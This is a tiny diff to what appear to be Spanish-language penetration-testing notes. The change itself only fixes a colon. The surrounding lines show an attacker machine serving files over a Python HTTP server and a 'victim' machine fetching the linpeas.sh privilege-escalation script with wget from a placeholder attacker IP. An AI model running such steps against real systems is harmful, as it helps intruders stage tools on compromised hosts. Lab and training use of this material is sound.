@@ -16,7 +16,7 @@ Maquina local(host):
     python3 -m http.server 9001
 
 
-Maquina remota(victim)>
+Maquina remota(victim):
 
     wget http://[IP_MAQUINA_LOCAL]:9001/linpeas.sh
     
